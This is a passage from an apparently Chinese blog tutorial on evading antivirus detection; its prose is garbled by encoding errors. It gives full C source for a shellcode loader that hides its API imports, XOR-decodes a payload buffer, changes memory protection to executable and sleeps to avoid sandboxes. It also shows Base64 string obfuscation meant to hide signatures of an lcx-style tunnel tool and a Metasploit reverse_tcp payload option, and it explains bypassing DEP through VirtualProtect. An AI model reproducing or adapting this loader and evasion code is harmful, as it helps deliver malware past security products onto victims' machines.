class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI * ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>main</code>å‡½æ•°ä¸­ï¼Œå®šä¹‰å››ä¸ªå‡½æ•°æŒ‡é’ˆæ¥å­˜æ”¾è¿™äº›å‡½æ•°çš„åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¥å£å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcodeé•¿åº¦</span></span><br><span class="line">DWORD dwThreadId; <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">HANDLE hThread; <span class="comment">// çº¿ç¨‹å¥æŸ„</span></span><br><span class="line">DWORD dwOldProtect; <span class="comment">// å†…å­˜é¡µå±æ€§</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–shellcodeå¤§å°</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¢åŠ å¼‚æˆ–ä»£ç  */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line"><span class="comment">//Sleep(50);</span></span><br><span class="line">_InterlockedXor8(buf + i, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">NULL, // åŸºå€</span></span><br><span class="line"><span class="comment">800,  // å¤§å°</span></span><br><span class="line"><span class="comment">MEM_COMMIT, // å†…å­˜é¡µçŠ¶æ€</span></span><br><span class="line"><span class="comment">PAGE_EXECUTE_READWRITE // å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)MyVirtualAlloc(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">shellcode_size,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE <span class="comment">// åªç”³è¯·å¯è¯»å¯å†™</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†shellcodeå¤åˆ¶åˆ°å¯è¯»å¯å†™çš„å†…å­˜é¡µä¸­</span></span><br><span class="line">CopyMemory(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span></span><br><span class="line">MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰å¾…å‡ ç§’ï¼Œå…´è®¸å¯ä»¥è·³è¿‡æŸäº›æ²™ç›’å‘¢ï¼Ÿ</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = MyCreateThread(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">MyWaitForSingleObject(hThread, INFINITE); <span class="comment">// ä¸€ç›´ç­‰å¾…çº¿ç¨‹æ‰§è¡Œç»“æŸ</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220162832.png"></p><h1 id="ç¬¬å…«è¯¾"><a href="#ç¬¬å…«è¯¾" class="headerlink" title="ç¬¬å…«è¯¾"></a>ç¬¬å…«è¯¾</h1><h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒC/C++ç¨‹åºä¸­çš„<strong>å­—ç¬¦ä¸²å¸¸é‡ä¼šè¢«ç¡¬ç¼–ç åˆ°ç¨‹åºä¸­ï¼ˆ.dataæ®µï¼Œä¹Ÿå°±æ˜¯æ•°æ®æ®µï¼‰</strong>ï¼Œå°¤å…¶æ˜¯å…¨å±€å˜é‡æœ€å®¹æ˜“è¢«å®šä½åˆ°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> global_string[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, global_string);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç¼–å†™çš„æ˜¯ä¸€äº›æ•æ„Ÿå‚æ•°çš„å·¥å…·ï¼Œå¾ˆå®¹æ˜“ä¼šè¢«æå–å‡ºç‰¹å¾ï¼Œä¾‹å¦‚lcxè¿™æ¬¾å·¥å…·ï¼Œå®ƒçš„å‚æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Usage of Packet Transmit:]</span><br><span class="line"></span><br><span class="line">lcx -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line"></span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -tran&lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>-listen</code>ã€<code>-tran</code>ã€<code>-slave</code>éå¸¸æ•æ„Ÿï¼Œä¸€èˆ¬å¸¸è§ç¨‹åºä¸ä¼šé«˜é¢‘ä½¿ç”¨è¿™äº›å‚æ•°åï¼Œå› æ­¤è½åœ°è¢«æ€ä¹Ÿæ˜¯æ„æ–™ä¹‹ä¸­ã€‚</p><h2 id="C-é‡è½½è¿ç®—ç¬¦"><a href="#C-é‡è½½è¿ç®—ç¬¦" class="headerlink" title="C++ é‡è½½è¿ç®—ç¬¦"></a>C++ é‡è½½è¿ç®—ç¬¦</h2><p>C++ å…è®¸åœ¨åŒä¸€ä½œç”¨åŸŸä¸­çš„æŸä¸ªå‡½æ•°å’Œè¿ç®—ç¬¦æŒ‡å®šå¤šä¸ªå®šä¹‰ï¼Œåˆ†åˆ«ç§°ä¸ºå‡½æ•°é‡è½½å’Œè¿ç®—ç¬¦é‡è½½ã€‚</p><p>é‡è½½çš„è¿ç®—ç¬¦æ˜¯å¸¦æœ‰ç‰¹æ®Šåç§°çš„å‡½æ•°ï¼Œå‡½æ•°åæ˜¯ç”±å…³é”®å­— operator å’Œå…¶åè¦é‡è½½çš„è¿ç®—ç¬¦ç¬¦å·æ„æˆçš„ã€‚ä¸å…¶ä»–å‡½æ•°ä¸€æ ·ï¼Œé‡è½½è¿ç®—ç¬¦æœ‰ä¸€ä¸ªè¿”å›ç±»å‹å’Œä¸€ä¸ªå‚æ•°åˆ—è¡¨ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadString</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">DWORD dwStrLength = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> szOutStr;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Base64decode</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> szBase64String, LPDWORD lpdwLen)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">BadString(<span class="built_in">std</span>::<span class="built_in">string</span> szInStr);</span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">std::string</span><span class="params">()</span></span>;</span><br><span class="line">~BadString();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &quot;BadString.h&quot;</span></span><br><span class="line"></span><br><span class="line">std::string BadString::Base64decode(std::string szBase64String, LPDWORD lpdwLen)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwLen;</span><br><span class="line">DWORD dwNeed;</span><br><span class="line">PBYTE lpBuffer = NULL;</span><br><span class="line">dwLen = szBase64String.length();</span><br><span class="line">dwNeed = <span class="number">0</span>;</span><br><span class="line">CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, NULL, &amp;dwNeed, NULL, NULL);</span><br><span class="line"><span class="keyword">if</span> (dwNeed)</span><br><span class="line">&#123;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwNeed + <span class="number">1</span>];</span><br><span class="line">ZeroMemory(lpBuffer, dwNeed + <span class="number">1</span>);</span><br><span class="line">CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, lpBuffer, &amp;dwNeed, NULL, NULL);</span><br><span class="line">*lpdwLen = dwNeed;</span><br><span class="line">&#125;</span><br><span class="line">return std::string((PCHAR)lpBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::BadString(std::string szInStr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;dwStrLength = szInStr.length();</span><br><span class="line"><span class="keyword">this</span>-&gt;szOutStr = <span class="keyword">this</span>-&gt;Base64decode(szInStr, &amp;<span class="keyword">this</span>-&gt;dwStrLength);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::operator std::string()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;szOutStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::~BadString()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ–¹å¼ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BadString.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(BadString(<span class="string">&quot;SGVsbG8gV29ybGQK&quot;</span>)) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡è®¾ä¸€ä¸ªåŠŸèƒ½å‡½æ•°çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CCooolisMetasploit::SendPayload</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> options, <span class="built_in">std</span>::<span class="built_in">string</span> payload)</span></span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œä¼ é€’çš„<code>std::string options</code>è¿™ä¸ªå­—ç¬¦ä¸²å¯èƒ½ä¼šè¢«å®šä½ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦åœ¨ä¼ å…¥ä¹‹å‰è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè¿›è¡Œä¸€æ¬¡è§£å¯†ï¼ŒæŠŠè§£å¯†åçš„å­—ç¬¦ä¸²ä¼ å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metasploit-&gt;add_option(CooolisString(&quot;LXAsLS1wYXlsb2Fk&quot;), msf_payload, CooolisString(&quot;UGF5bG9hZCBOYW1lLCBlLmcuIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3A&#x3D;&quot;))-&gt;default_str(CooolisString(&quot;d2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcA&#x3D;&#x3D;&quot;));</span><br></pre></td></tr></table></figure><h1 id="ç¬¬ä¹è¯¾"><a href="#ç¬¬ä¹è¯¾" class="headerlink" title="ç¬¬ä¹è¯¾"></a>ç¬¬ä¹è¯¾</h1><h2 id="æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰"><a href="#æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰" class="headerlink" title="æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰"></a>æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰</h2><p>DEP(Data Execution Prevention)å³â€œ æ•°æ®æ‰§è¡Œä¿æŠ¤â€ï¼Œè¿™æ˜¯Windowsçš„ä¸€é¡¹å®‰å…¨æœºåˆ¶ï¼Œä¸»è¦ç”¨æ¥é˜²æ­¢ç—…æ¯’å’Œå…¶ä»–å®‰å…¨å¨èƒå¯¹ç³»ç»Ÿé€ æˆç ´åã€‚ <strong>å¾®è½¯ä»Windows XP SP2å¼•å…¥äº†è¯¥æŠ€æœ¯ï¼Œå¹¶ä¸€ç›´å»¶ç»­åˆ°ä»Šå¤©ã€‚</strong></p><hr><p>ä¸ºä»€ä¹ˆè¦æœ‰DEPï¼š</p><p>åœ¨Windows Xp SP2 ä¹‹å‰çš„æ—¶ä»£ï¼Œç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨é—¨æ§›å¤ªä½äº†ï¼Œåªè¦å‘ç°æœ‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå°±å¯ä»¥ç›´æ¥ç¨³å®šåˆ©ç”¨ï¼Œæ”»å‡»è€…åªéœ€è¦å°†Shellcodeä¸æ–­å†™å…¥å †æ ˆï¼Œç„¶åè¦†ç›–å‡½æ•°è¿”å›åœ°å€ï¼Œä»£ç å°±å¯ä»¥åœ¨å †æ ˆä¸­æ‰§è¡Œã€‚ä½†å †æ ˆçš„ç”¨é€”ä¸»è¦æ˜¯ä¿å­˜å¯„å­˜å™¨ç°åœºï¼Œæä¾›ä¸€ä¸ªå‡½æ•°è¿è¡Œæ—¶çš„å­˜å‚¨ç©ºé—´ï¼Œæå°‘æ•°éœ€è¦ä»£ç åœ¨å †æ ˆä¸­æ‰§è¡Œï¼Œäºæ˜¯å¾®è½¯ä¸ºäº†ç¼“è§£ç±»ä¼¼çš„æƒ…å†µï¼Œå‘æ˜äº†DEPä¿æŠ¤æœºåˆ¶ï¼Œç”¨äºé™<strong>åˆ¶æŸäº›å†…å­˜é¡µä¸å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</strong></p><h2 id="å¦‚ä½•ç»•è¿‡DEP"><a href="#å¦‚ä½•ç»•è¿‡DEP" class="headerlink" title="å¦‚ä½•ç»•è¿‡DEP"></a>å¦‚ä½•ç»•è¿‡DEP</h2><p><code>VirtualProtect</code>è¿™ä¸ªAPIèƒ½å¤Ÿæ›´æ”¹å†…å­˜é¡µçš„å±æ€§ä¸ºå¯æ‰§è¡Œæˆ–ä¸å¯æ‰§è¡Œï¼Œå¯¹äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨æ¥è¯´ï¼Œæº¢å‡ºçš„æ—¶å€™ï¼ŒæŠŠè¿”å›åœ°å€è®¾è®¡ä¸º<code>VirtualProtect</code>çš„åœ°å€ï¼Œå†ç²¾å¿ƒæ„é€ ä¸€ä¸ªæ ˆä¸ºè°ƒç”¨è¿™ä¸ªAPIçš„æ ˆï¼Œå°±å¯ä»¥æ”¹å˜å½“å‰æ ˆçš„å†…å­˜é¡µçš„å±æ€§ï¼Œä½¿å…¶ä»â€ä¸å¯æ‰§è¡Œâ€å˜æˆâ€å¯æ‰§è¡Œâ€ã€‚</p><h2 id="ä¸¾ä¸€åä¸‰"><a href="#ä¸¾ä¸€åä¸‰" class="headerlink" 